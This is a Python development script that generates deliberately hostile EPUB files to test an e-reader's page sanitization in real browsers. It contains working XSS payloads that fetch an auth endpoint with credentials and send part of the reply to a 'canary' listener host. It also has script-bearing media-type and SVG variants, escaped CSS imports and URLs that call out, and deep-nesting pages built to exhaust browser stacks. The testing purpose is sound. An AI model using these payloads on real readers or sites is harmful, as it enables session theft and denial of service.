# ruff: noqa: E501
"""Invented hostile books for the reader's tests in real browsers.

Each book carries a payload that marks the window of the app, its storage and a listener on another host if it ever runs, and
each is a different way for a book to get a script, a request or a crash through the cleaning of a page: pages given a media type
that a browser would draw as a page (with parameters, in capitals, XML, a type that is none), SVG as a page of the spine, style
sheets that write ``url(`` and ``@import`` with CSS escapes, comments and notations other than ``url()``, and pages nested so
deeply (or with so many nodes) that a browser's own stack gives out.

A development tool; it is not part of the image.

    python tools/make_hostile_books.py --out <folder> [--canary http://127.0.0.1:18588]

``--canary``: the address the payloads try to reach (a listener of the test, which counts every visit).
"""

from __future__ import annotations

import argparse
import os
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import make_reader_books as m


def payload(canary: str, mark: str) -> str:
    """Script that marks the top window, the storage, and a listener on another host. No `&`, `<` or `>`: XML-safe."""
    return (f"top.__pwn=(top.__pwn||'')+'{mark};';try{{localStorage.setItem('pwn','{mark}')}}catch(e){{}};"
            f"try{{new Image().src='{canary}/ran-{mark}'}}catch(e){{}};"
            f"try{{fetch('/api/v1/auth/me',{{credentials:'include'}}).then(function(r){{return r.text()}}).then(function(t){{"
            f"new Image().src='{canary}/leak-{mark}?'+encodeURIComponent(t.slice(0,40))}})}}catch(e){{}};"
            f"try{{window.open('{canary}/popup-{mark}')}}catch(e){{}};try{{top.location='{canary}/nav-{mark}'}}catch(e){{}}")


def xhtml(body: str, head: str = "") -> str:
    return ('<?xml version="1.0" encoding="utf-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" '
            'xmlns:xlink="http://www.w3.org/1999/xlink"><head><title>t</title>' + head +
            '</head><body><h1 id="top">Visible text of the page</h1>' + body + "</body></html>")


class Maker:
    def __init__(self, out: Path, canary: str) -> None:
        self.out = out
        self.canary = canary

    def book(self, name: str, html: str, *, media: str = "application/xhtml+xml", extra_files: dict | None = None,
             extra_manifest: str = "", spine_extra: str = "") -> None:
        files: dict[str, bytes | str] = {"c1.xhtml": html, "c2.xhtml": m.chapter_html("Second", 2, 3),
                                         "nav.xhtml": m.nav([("One", "c1.xhtml", []), ("Two", "c2.xhtml", [])])}
        files.update(extra_files or {})
        manifest = ('<item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>'
                    f'<item id="c1" href="c1.xhtml" media-type="{media}"/>'
                    '<item id="c2" href="c2.xhtml" media-type="application/xhtml+xml"/>' + extra_manifest)
        m.write_epub(self.out / f"{name}.epub", title=name, author="Nobody", language="en", files=files,
                     opf_manifest=manifest, opf_spine='<itemref idref="c1"/><itemref idref="c2"/>' + spine_extra)

    def run(self) -> None:
        c = self.canary

        def p(mark: str) -> str:
            return payload(c, mark)

        # The media types a browser would draw as a page, written in the ways a manifest can write them.
        script = lambda mark: f"<script>{p(mark)}</script><img src=\"x:y\" onerror=\"{p(mark + '_err')}\"/>"
        for name, media in (("type-xml", "application/xml"), ("type-text-xml", "text/xml"),
                            ("type-param", "application/xhtml+xml; charset=utf-8"), ("type-capitals", "APPLICATION/XHTML+XML"),
                            ("type-html-capitals", "TEXT/HTML"), ("type-xml-param", "application/xml; charset=utf-8"),
                            ("type-plain", "text/plain"), ("type-dtbook", "application/x-dtbook+xml"),
                            ("type-octet", "application/octet-stream"), ("type-mathml", "application/mathml+xml")):
            self.book(name, xhtml(script(name)), media=media)
        # An XML page that is no XHTML, with an XHTML script in it.
        self.book("type-xml-rss", f'<?xml version="1.0"?><rss version="2.0"><channel><title>feed</title>'
                  f'<script xmlns="http://www.w3.org/1999/xhtml">{p("rss")}</script></channel></rss>', media="application/xml")
        # SVG as a page of the spine.
        svg = (f'<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" onload="{p("svg_onload")}">'
               f'<script>{p("svg_page")}</script><rect width="100" height="100" fill="red"/></svg>')
        self.book("page-svg", xhtml("<p>after the svg</p>"), extra_files={"a.svg": svg},
                  extra_manifest='<item id="s" href="a.svg" media-type="image/svg+xml"/>', spine_extra='<itemref idref="s"/>')
        # Style sheets: every way to write what fetches, with escapes, comments and the other notations.
        css = (f"@\\69mport '{c}/css-import-esc.css'; @import url({c}/css-import.css); @IMPORT URL('{c}/css-import-upper.css');"
               f"@import/**/'{c}/css-import-comment.css'; @i\\6d port url({c}/css-import-esc2.css);"
               f"p.a{{background:u\\72l({c}/css-bg-esc.png)}} p.b{{background:\\75rl('{c}/css-bg-esc2.png')}} "
               f"p.c{{cursor:url({c}/css-cursor.png),auto}} p.d{{list-style-image:url({c}/css-list.png)}} "
               f"p.e::before{{content:url({c}/css-content.png)}} p.f{{background-image:image-set(\"{c}/css-is1.png\" 1x)}} "
               f"p.g{{background-image:-webkit-image-set(url({c}/css-is2.png) 1x)}} "
               f"p.h{{background:image-set(url({c}/css-is3.png) 1x, url({c}/css-is4.png) 2x)}} "
               f"@font-face{{font-family:X;src:url({c}/css-font.woff2)}} p.i{{font-family:X}} p.j{{border-image:url({c}/css-border.png) 10}} "
               f"p.k{{mask:url({c}/css-mask.png)}} p.l{{background:URL( {c}/css-upper.png )}} "
               f"p.m{{background:ur\\6c({c}/css-esc3.png)}} p.n{{background:src('{c}/css-src.png')}} "
               f"p.o{{background:image('{c}/css-image-fn.png')}} p.p{{background:url(  '{c}/css-sp.png'  )}} "
               f"p.q{{background:u\\000072l({c}/css-esc-long.png)}} p.r{{background:url(ht\\74 tp://{c.split('://', 1)[1]}/css-esc-addr.png)}} "
               f"p.s{{background:cross-fade(url({c}/css-xfade.png), url(b.png), 50%)}} p.t{{background-image:image\\2d set('{c}/css-is-esc.png' 1x)}} "
               f"@namespace svg url({c}/css-ns);")
        classes = "".join(f'<p class="{k}">cls {k}</p>' for k in "abcdefghijklmnopqrst")
        inline = (f'<div style="background:u\\72l({c}/css-inline-esc.png);cursor:url({c}/css-inline-cursor.png),auto">x</div>'
                  f'<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40"><rect fill="u\\72l({c}/css-svg-fill.svg#p)" '
                  f'filter="url({c}/css-svg-filter.svg#f)" width="10" height="10"/></svg>')
        self.book("css-escapes", xhtml(classes + inline, head=f"<style>{css}</style>"))
        # Nesting: far deeper than a browser lays out, and so many nodes that the page is cut.
        self.book("deep-xhtml", xhtml("<div>" * 20000 + "deep text" + "</div>" * 20000))
        self.book("deep-html", "<html><body>" + "<div>" * 60000 + "deep text" + "</div>" * 60000 + "</body></html>",
                  media="text/html")
        self.book("deep-100", xhtml("<div>" * 100 + "<p>below the depth that is flattened</p>" + "</div>" * 100))
        for name, open_, close, levels in (("nest-div", "<div>", "</div>", 60), ("nest-span", "<span>", "</span>", 60),
                                           ("nest-quote", "<blockquote>", "</blockquote>", 60),
                                           ("nest-list", "<ul><li>", "</li></ul>", 30),
                                           ("nest-table", "<table><tbody><tr><td>", "</td></tr></tbody></table>", 15),
                                           ("nest-inline", "<em><b><i>", "</i></b></em>", 20)):
            self.book(name, xhtml(open_ * levels + "<p>deepest words of the nest</p>" + close * levels))
        # More nodes than a page may have (100,000), in the shape of a real text: paragraphs of spans. (A flat run of tens of
        # thousands of inline elements is laid out in time that grows with its square in some engines, cut or not.)
        self.book("many-nodes", xhtml(("<p>" + "<span>w </span>" * 20 + "</p>") * 3000))
        # One unbroken run of 20,000 inline elements: WebKit lays it out in a minute unless the reader keeps it short
        # (``limits.inline`` of the cleaning); Chromium and Firefox take under a second.
        self.book("inline-run", xhtml("<p>" + "<span>w</span>" * 20000 + "</p>"))


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--out", required=True, type=Path)
    parser.add_argument("--canary", default="http://127.0.0.1:18588")
    args = parser.parse_args()
    args.out.mkdir(parents=True, exist_ok=True)
    Maker(args.out, args.canary).run()
    # The scan leaves a file that was changed a moment ago for its next run: these are old enough.
    stamp = time.time() - 3600
    for each in args.out.iterdir():
        os.utime(each, (stamp, stamp))
    print(f"{len(list(args.out.iterdir()))} books in {args.out}")


if __name__ == "__main__":
    main()
